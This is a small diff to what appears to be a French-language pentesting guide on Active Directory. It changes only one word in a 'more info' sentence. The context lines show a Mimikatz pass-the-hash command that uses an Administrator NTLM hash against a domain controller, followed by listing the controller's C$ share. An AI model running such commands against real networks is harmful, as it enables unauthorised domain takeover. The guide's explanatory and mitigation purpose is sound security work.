@@ -33,7 +33,7 @@ sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3a
 #And in new spawned powershell you now can access via NTLM the content of C$
 ls \\dc-host-name\C$
 ```
-Plus d'infos à ce sujet sur : [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) et [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
+Plus d'infos à ce sujet dans : [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) et [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
 
 ## Atténuation
 
